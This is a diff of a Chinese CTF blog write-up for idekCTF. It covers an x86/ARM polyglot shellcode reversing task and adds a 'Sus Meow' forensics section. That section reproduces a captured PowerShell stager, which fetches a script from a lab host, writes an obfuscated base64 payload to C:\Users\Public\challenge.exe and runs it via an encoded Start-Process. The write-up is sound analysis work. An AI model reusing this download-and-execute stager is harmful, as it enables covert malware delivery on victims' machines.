@@ -487,21 +487,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-01-15
+                    2023-01-16
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    2.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    8 分
+                    11 分
                 </div>
                 
 
@@ -524,18 +524,18 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="idekCTF"><a href="#idekCTF" class="headerlink" title="idekCTF"></a>idekCTF</h1><h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><p>题目Polyglot，首先这个单词的英文含义就是<code>通晓(或使用)多种语言的；用多种语言写成的；通晓并使用多种语言的</code>,这个也算是一个提示把。</p>
+                <h1 id="idekCTF"><a href="#idekCTF" class="headerlink" title="idekCTF"></a>idekCTF</h1><h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="Polyglot"><a href="#Polyglot" class="headerlink" title="Polyglot"></a>Polyglot</h3><p>题目Polyglot，首先这个单词的英文含义就是<code>通晓(或使用)多种语言的；用多种语言写成的；通晓并使用多种语言的</code>,这个也算是一个提示把。</p>
 <p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20230115201314.png" alt="题目"></p>
 <p>题目中给出的是一个代码片段，不是完整的程序。 <code>x86</code>和<code>ARM</code>两种架构反编译之后会得到不同的执行流。但是程序开头的第一句肯定是指令而不是数据，因为CPU无法判断这些二进制是否是数据。</p>
 <p>这个shellcode是把<code>x86</code>和<code>ARM</code>两种不同的架构集成到一起了，在程序的开头第一句指令做了兼容，在<code>x86</code>下，会直接跳转。而在<code>ARM</code>架构下则会执行。</p>
 <p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20230115202453.png" alt="ARM架构下"></p>
 <p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20230115202655.png" alt="X86架构下"></p>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>将<code>Polyglot</code>分别在<code>x86</code>和<code>ARM</code>两种架构下，进行反编译操作。通过解析代码流程，逆向解密过程。</p>
+<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>将<code>Polyglot</code>分别在<code>x86</code>和<code>ARM</code>两种架构下，进行反编译操作。通过解析代码流程，逆向解密过程。</p>
 <p><code>ARM</code>架构下的代码比较好分析，就是一个循环的异或操作，本身没有什么困难的地方。</p>
 <p><code>X86</code>架构下，则要困难一些，包含了两个解密操作。</p>
 <p>第一个解密操作，按照正常汇编代码的逻辑，然后用c语言复现了一遍。</p>
 <p>第二个解密操作，汇编代码稍微有点复杂，所以是直接复制的ida反编译之后的函数。然后判断了一下这个函数的参数。</p>
-<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++"># include &lt;stdio.h&gt;
+<h4 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h4><h5 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h5><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++"># include &lt;stdio.h&gt;
 # include  &lt;stdint.h&gt;
 
 
@@ -697,7 +697,7 @@ int main()
 &#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++"># include &lt;stdio.h&gt;
+<h5 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h5><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++"># include &lt;stdio.h&gt;
 # include  &lt;stdint.h&gt;
 
 unsigned char rsp[] &#x3D;
@@ -731,6 +731,45 @@ int main()&#123;
 &#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+
+
+
+
+<h2 id="Sus-Meow"><a href="#Sus-Meow" class="headerlink" title="Sus Meow"></a><strong>Sus Meow</strong></h2><p>第二个题目，是一段网络通信数据包的二进制文件。用wireshark分析还报错。所以也只能看十六进制显示的内容了。</p>
+<p>然后我就猜着，会不会是这个解压出来的二进制文件，仍然是一个压缩包呢？  于是把<code>sus-meow </code> 更名为<code>sus-meow.zip</code>。然后解压缩一下，还真的解压出来了。一个<code>attachments</code>的文件夹里面包含了<code>challenge.pcapng</code>的文件。</p>
+<p><strong>这里，我又去查了一下，发现zip压缩、rar压缩，出来的二进制文件。都不是以<code>attachements/</code>开头的。但是为啥这种方法就奏效了？，难道本身就是文件目录转换为的二进制？</strong></p>
+<p>现在可以用wireshark分析<code>challenge.pcapng</code>了。追踪流之后，感觉像是用PowerShell 给服务器发指令+加密的恶意代码，然后让服务器解密+运行恶意代码。解密可以明显的看到用的是<code>FromBase64String</code></p>
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;muahaha.ps1 HTTP&#x2F;1.1
+User-Agent: Mozilla&#x2F;5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell&#x2F;5.1.19041.1682
+Host: 10.0.2.15
+Connection: Keep-Alive
+
+HTTP&#x2F;1.0 200 OK
+Server: SimpleHTTP&#x2F;0.6 Python&#x2F;3.10.8
+Date: Wed, 11 Jan 2023 11:02:35 GMT
+Content-type: application&#x2F;octet-stream
+Content-Length: 108368
+Last-Modified: Wed, 11 Jan 2023 10:55:29 GMT
+
+$cph8&#x3D;(&quot;&#123;4&#125;&#123;8&#125;&#123;1&#125;&#123;6&#125;&#123;3&#125;&#123;7&#125;&#123;0&#125;&#123;5&#125;&#123;2&#125;&#123;11&#125;&#123;9&#125;&#123;10&#125;&quot; -f
+&#39;3URi0QkHDmEJJgAAAAPhLMCAACNjCSUAAAAi0UAMdKNdQSJDCSJ0Yn1id6Jwrh4AAAA6K3h&#x2F;&#x2F;&#x2F;pEfr&#x2F;&#x2F;4uUJJgAAACDyiCJlCSYAAAA9sIED4Ve&#x2F;f&#x2F;&#x2F;3UUAjXUI2cDZ5Zvf4GYlAEVmPQABD4SzAgAA23wkQNtsJEAPt3wkSGaF&#x2F;3kKgMqAiZQkmAAAANnlm9&#x2F;g3dhmJQBFZj0ABQ+EfAMAANt8JDCLRCQwi1QkNGaB5&#x2F;9&#x2F;D4RMAwAAZoH&#x2F;ADwPjxwCAAAPv++5ATwAACnpMe0PrdDT6vbBIA9Fwg9F1QH5jbkEwP&#x2F;
+··········
+
+$lUOIoOXye4ZWRJ79vwRvpERQ &#x3D; (&#39;&#123;2&#125;&#123;3&#125;&#123;0&#125;&#123;5&#125;&#123;4&#125;&#123;1&#125;&#39; -f &#39;s\Pub&#39;,&#39;xe&#39;,&#39;C:\Us&#39;,&#39;er&#39;,&#39;lenge.e&#39;,&#39;lic\chal&#39;)
+
+$xP6FknJVZBb &#x3D; [Convert]::FromBase64String($cph8)
+[IO.File]::WriteAllBytes($lUOIoOXye4ZWRJ79vwRvpERQ, $xP6FknJVZBb)
+&amp; ([string]::join(&#39;&#39;, ( (83,116,97,114,116,45,80,114,111,99,101,115,115) |%&#123; ( [char][int] $_)&#125;)) | % &#123;$_&#125;) (&#39;&#123;2&#125;&#123;3&#125;&#123;0&#125;&#123;5&#125;&#123;4&#125;&#123;1&#125;&#39; -f &#39;s\Pub&#39;,&#39;xe&#39;,&#39;C:\Us&#39;,&#39;er&#39;,&#39;lenge.e&#39;,&#39;lic\chal&#39;)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>后面还有一些关于<code>powershell的命令</code>，我大胆的在自己的powershell下面执行了一下<code>&#39;&#123;2&#125;&#123;3&#125;&#123;0&#125;&#123;5&#125;&#123;4&#125;&#123;1&#125;&#39; -f &#39;s\Pub&#39;,&#39;xe&#39;,&#39;C:\Us&#39;,&#39;er&#39;,&#39;lenge.e&#39;,&#39;lic\chal&#39;</code>–前面的数字其实是后面字符串的位置–拼起来就是<code>C:\Users\Public\challenge.exe</code>。这个exe负责存储base64解密之后的数据。</p>
+<p>最后一行的指令<code>[string]::join(&#39;&#39;, ( (83,116,97,114,116,45,80,114,111,99,101,115,115) |%&#123; ( [char][int] $_)&#125;)) | % &#123;$_&#125;</code>—  先把十进制数转换为char类型，然后用转换后的字符串开启进程，执行exe恶意程序。<strong>具体Poweshell命令的细节，就不写了</strong>  </p>
+<ul>
+<li>83,116,97,114,116,45,80,114,111,99,101,115,115  -对应的字符串– <code>Start-Process</code></li>
+</ul>
+<p>然后，我就基本上在powershell中执行了一下所有的命令，就是没执行<del>哈哈哈。 说实在的，这种还是危险的，这里是图懒省事。！</del></p>
+<p>这样的话，就把恶意程序给找到了<code>challenge.exe</code>。</p>
+<p>之后就是反编译了，目前还没什么线索呢。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
 <li><code>Shift + E</code>可以把数据导出，选择合适的格式。根本没办法一个一个复制。</li>
 <li>简单的汇编代码逻辑，我基本可以读懂了。但是稍微一复杂，就捉襟见肘了。虽然可以采用复制ida反汇编之后的函数，但是这种方式不利用长久的发展。—-后续还得加强吧。我估计看汇编也能看出来，就是比较耗时。</li>
@@ -1357,7 +1396,7 @@ int main()&#123;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">128.1k</span>
+                        class="white-color">128.9k</span>
             
             
             
